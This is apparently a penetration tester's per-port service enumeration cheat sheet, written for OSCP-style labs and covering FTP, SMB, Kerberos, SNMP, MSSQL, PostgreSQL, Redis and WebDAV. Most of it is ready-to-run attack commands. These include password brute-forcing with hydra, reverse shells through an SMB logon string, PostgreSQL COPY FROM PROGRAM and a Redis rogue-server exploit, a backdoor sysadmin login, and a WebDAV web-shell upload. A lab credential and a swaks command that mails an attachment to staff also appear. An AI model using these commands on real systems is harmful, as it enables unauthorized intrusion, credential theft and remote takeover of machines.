---
icon: network-wired
---

# Service Enum

## Port 21 - FTP

```bash
# Nmap to find known vulnerability and detailed scan
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $ip

# try anonymous login 
username -> anonymous
password ->

# download
Get file.txt

# upload 
put file.txt

#Use binary mode
binary
put file.exe
```



## Port 22 - SSH

```bash
# sign-in using private key
ssh -i rsa_id user@ip

### # Bruteforce using Hydra
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

```

## Port 25/587/465 - SMTP

<pre class="language-bash"><code class="lang-bash"># nmap enum
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v

# username enum
sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.1.65

#### Interactions
# using nc
<strong>nc -nvvC 10.11.1.111 25
</strong>HELO foo&#x3C;cr>&#x3C;lf>

# using telnet
telnet 10.11.1.111 25
VRFY root

</code></pre>

#### Sending Email - (using swaks)

```bash
# Sending Email using Mark Credentials
username:mark
Password: OathDeeplyReprieve91 

# createe email body in body.txt

sudo swaks -t jim@relia.com -t adrian@relia.com -t damon@relia.com  -t mark@relia.com -t anita@relia.com --from emma@relia.com --attach @config.Library-ms --server 192.168.238.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

## Port 79 - Finger

HTB -> Sunday&#x20;

```bash
/finger-user-enum.pl -U /usr/share/seclists/Seclists/Usernames/Names/names.txt -t 10.10.10.76 

finger @<Victim>       #List logged in users
finger user@<Victim>

Metasploit: scanner/finger/finger_users
```

## Port 88 - Kerberos

```bash
# Enum using nmap
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/usernames.txt <IP>
nmap --script krb5-enum-users --script args krb5-enum-users.realm=domain_name.

# UNAUTH - getNPuser using Impacket 
GetNPUsers.py -dc-ip 172.31.3.9 spray.csl/ -usersfile names.txt -outputfile NPNUsers_output -format john

# UNAUTH - Verify validUSerName and also perfrom ASRep 
# TOOL -> https://github.com/ropnop/kerbrute
./kerbrute_linux_amd64 userenum --dc <IP> -d <domain> usernames.txt 

# using metasploit
use auxiliary/gather/kerberos_enumusers
set TIMEOUT 20

#Authenticated | get all username list using Impacket
GetADUsers.py -all <domain\User> -dc-ip <DC_IP>

```

## Port 110/995 - Pop3

```bash
#Banner grabbing
nc -nv 10.11.0.22 110 
telnet 10.10.10.17 110

#Brute-force
nmap -sV --script=pop3-brute <target>

#List messages
list

#Read message number
retr 1

#To send email using STMP for LFI /var/mail/ValidUserHere
EHLO hacker.anything.com
mail from:hacker@domain.com
rcpt to:victimemail@mail.com
data
Subject: email title
<your LFI code here>
<new blank line>
```

## Port 135 - MSRPC

Used to query for information on the machine.&#x20;

Amazing Artical

[https://www.hackingarticles.in/active-directory-enumeration-rpcclient/](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)

```bash
# Identifying vulnerable versions
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom

#Null session
rpcclient -U "" <IP> -N
rpcclient -U <Username> <IP> -c "enumdomusers"

rpcclient -p <target>

#Server info
srvinfo
enumprivs

#Enumerate user/group using RID
queryusergroups <RID>
querygroup <RID>
queryuser 500

#Groups
enumalsgroups domain
enumalsgroups builtin

#Identify SID
lookupnames <username/groupname>

#Enum description
querydispinfo

#Password Policy
getdompwinfo

#setuserinfo2 username level password
setuserinfo <user> 23 <pass>


## Correct way of changing password via RPC
# use when user have All generic permission over another user. 
setuserinfo2 audit2020 23 'Password@123'

```





## Port 139/445 - SMB

<pre class="language-bash"><code class="lang-bash"><strong># nmap enum
</strong>nmap -sC -p 139,445 -sV 172.16.241.10-13,82-83,254
# nmap smb enum &#x26; vuln
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111


# Enum hostname
enum4linux -n 10.11.1.111
nmblookup -A 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111


# using smbMap
smbmap -H 172.16.241.10 -R

##### using smbClient - 
# unauth
smbclient -N -L //$ip/

# as guest user but no password
smbclient -N -L //$ip/ -U guest

# as blank username/password
smbclient -L //$ip/ -U ''
> ''

# connecting to SMB with auth
smbclient //$ip/share -U 'john'
> &#x3C;password>

###@ Using Crackmapexec
crackmapexec share -u '' -p '' $ip --shares
crackmapexec share -u '' -p '' $ip -M spider_plus

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

#smb reverse shell with "logon" cmd
logon "/=`nc 10.10.14.5 4444 -e /bin/bash`"

#### Interesting policy
# look for user&#x26;pass "gpp-decrypt "
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml 


</code></pre>



## Port 143/993 IMAP

```bash
# Banner Grab
telnet 10.11.1.111 143 #Connect to read emails

openssl s_client -connect 10.11.1.111:993 -quiet  #Encrypted connection

```



## Port 161/162 UDP - SNMP

```bash
# enum using nmap
nmap 192.168.168.189 --script=smtp* -p 25
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111

# using snmp-check
snmp-check 192.168.167.42
snmp-check 10.11.1.111 -c public|private|community

#### using SNMPWALK
snmpwalk -c public -v1 10.11.1.219
iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP "
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (66160) 0:11:01.60

# SNMP Community Strings
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

snmpwalk -c <communityString> <ipAddress> <mibValue>
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Windows Users
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Running Windows Processes
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

#Enumerating Open TCP Ports
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

#Enumerating Installed Software
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2

#Enumerating Windows Users
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25

#Enumerating Running Windows Processes
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2

#Enumerating Open TCP Ports
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3

#Enumerating Installed Software
snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2

#### OneSixtyOne - Bruteforcing community strings
onesixtyone -c ListOfcommunity.txt -i ListOfIps.txt

```

### SNMP -> RCE

Refer for more info -> [https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)

{% hint style="info" %}
If you have a SNMP community with write permissions on a Linux target, you can archive code execution by abusing the NET-SNMP-EXTEND-MIB extension.\
\
<mark style="color:orange;">`snmpwalk -v X -c public $ip NET-SNMP-EXTEND-MIB::nsExtendOutputFull`</mark>

> NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
{% endhint %}





## Port 389/636/3268/3269 - LDAP&#x20;

```bash
# enumerating without credentials
ldapsearch -x -H ldap://192.168.223.122 -D '' -w '' -b "DC=hutch,DC=offsec"

#### Query to get exact user
# Extract users:
-b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"

# Extract computers:
 -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract my info:
-b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Domain Admins:
-b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Domain Users:
-b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Enterprise Admins:
-b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Administrators:
-b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

# Extract Remote Desktop Group:
-b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

# To see if you have access to any password you can use grep after executing one of the queries:
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"

```



## Port 1433 - MSSQL

Details here -> [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

<pre class="language-bash"><code class="lang-bash"># nmap enum
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &#x3C;IP>


# using metsploit auxiliary module
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
<strong>
</strong><strong># using sqsh
</strong><strong>sqsh -S 10.11.1.111 -U sa
</strong>	xp_cmdshell 'date'
  	go
sqsh -S &#x3C;IP> -U &#x3C;Username> -P &#x3C;Password> -D &#x3C;Database>
  
  

####  Login into server
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] &#x3C;DOMAIN>/&#x3C;USERNAME>:&#x3C;PASSWORD>@&#x3C;IP>

## COMMAND SYNTAX
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master
#Get table names
SELECT * FROM &#x3C;databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'



# executing remote command using crackmapexec
# Username + Password + CMD command
crackmapexec mssql -d &#x3C;Domain name> -u &#x3C;username> -p &#x3C;password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d &#x3C;Domain name> -u &#x3C;username> -H &#x3C;HASH> -X '$PSVersionTable'

</code></pre>



## Port 3306 - MySQL

```bash
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

## MYSQL Common commands
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

```

## Port 3389 - RDP

<pre class="language-bash"><code class="lang-bash"><strong>## Enumeration using Nmap
</strong>nmap -p 3389 --script=rdp-vuln-ms12-020.nse

<strong>
</strong><strong># bruteforce using hydra
</strong>hydra -V -f -L ./users.txt -P ./passwords.txt rdp -M targets.txt -t 1 -W 3 -c 5

# login using xfreedrp
xrdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111


<strong>########## Enable RDP
</strong>#Powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

#Alternative
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

#Disable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"

</code></pre>

## Port 5432/5433 - PostgreSQL&#x20;

hacktrick -> [https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

```bash
# connecting with default password
psql -h 192.168.197.47 -p 5437 -U postgres

# Commands
\list # list db
\c <database> # use the db
\d # list tables
\du # get user roles

SELECT user # get current user

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s

###### Priv Esc via Postgres
CREATE TABLE cmd(cmd_output text); 
COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/192.168.49.114/80 0>&1';

```

## Port 5985 - WinRM

```bash
# Enabling winrm and adding all user to trusted host list
Enable-PSRemoting -Force  Set-Item wsman:\localhost\client\trustedhosts *  

# Connecting to winrm
evil-winrm -u Administrator -p 'Password'  -i <IP>/<Domain>
evil-winrm -u <username> -H <Hash> -i <IP>

## Bruteforce using crackmapexec
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

```



## Port 6379 - Redis&#x20;

```bash
### By default Redis can be accessed without credentials
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis

https://github.com/vulhub/redis-rogue-getshell.git
sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.89/8080 0>&1'"

```

## Webdav

### Uploading a shell (Authenticated)&#x20;

Consider a scenario where we have a web application hosted on port 80 with WebDAV enabled. To gain an initial foothold, we can exploit WebDAV by uploading a web shell (e.g., `/usr/share/webshells/aspx/cmdasp.aspx`) using the Cadaver tool. Once the web shell is uploaded, we can access it by navigating to port 80.

<pre class="language-bash"><code class="lang-bash"># using cadver
<strong>cadaver http://192.168.120.108
</strong><strong>>
</strong>Authentication required for 192.168.120.108 on server `192.168.120.108':
Username: user
Password: test

dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
Uploading /usr/share/webshells/aspx/cmdasp.aspx to `/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.

dav:/>
</code></pre>

### Davtest <a href="#davtest" id="davtest"></a>

DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.

```
davtest -url http://10.10.10.15
```

